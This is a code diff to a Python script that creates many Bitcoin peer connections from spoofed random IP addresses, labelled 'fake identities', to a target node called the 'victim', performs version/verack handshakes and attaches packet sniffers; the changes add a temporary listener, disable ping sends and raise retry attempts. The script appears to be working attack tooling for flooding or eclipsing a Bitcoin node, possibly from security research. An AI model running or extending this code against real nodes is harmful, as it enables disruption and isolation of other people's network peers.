@@ -207,6 +207,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
 
+	temp_listener = None
 	try:
 		# Send version packet
 		version = version_packet(src_ip, dst_ip, src_port, dst_port)
@@ -218,10 +219,13 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		s.sendall(verack.to_bytes())
 		# Get verack packet
 		verack = s.recv(1024)
+		if verbose: print(f'Attaching temporary packet listeners to {interface}')
+		temp_listener = create_task(True, 'Temp victim identity ' + src_ip, sniff, s, None, src_ip, src_port, dst_ip, dst_port, interface)
 		# Send a ping
-		s.sendall(ping_packet().to_bytes())
+		#s.sendall(ping_packet().to_bytes())
 	except:
 		print('Failed to send packets to victim')
+		if temp_listener != None: temp_listener.stop()
 		close_connection(s, src_ip, src_port, interface)
 		rand_ip = random_ip()
 		create_task(False, 'Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
@@ -239,6 +243,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 	# Listen to the connections for future packets
 	if mirror_socket != None:
 		if verbose: print(f'Attaching packet listeners to {interface}')
+		if temp_listener != None: temp_listener.stop()
 		create_task(True, 'Victim identity ' + src_ip, sniff, s, mirror_socket, src_ip, src_port, dst_ip, dst_port, interface)
 		create_task(True, 'Mirror identity ' + src_ip, mirror_sniff, mirror_socket, s, src_ip, src_port, dst_ip, dst_port, interface)
 
@@ -291,7 +296,7 @@ def mirror_make_fake_connection(interface, src_ip, verbose=True):
 	# Get verack packet
 	verack = s.recv(1024)
 	# Send a ping
-	s.sendall(ping_packet().to_bytes())
+	#s.sendall(ping_packet().to_bytes())
 	if verbose: print('Mirrored connection successful!')
 	return s
 
@@ -579,7 +584,7 @@ if __name__ == '__main__':
 	# Create the connections
 	for i in range(1, num_identities + 1):
 		try:
-			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = 3)
+			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip, verbose = True, attempt_number = 5)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
 
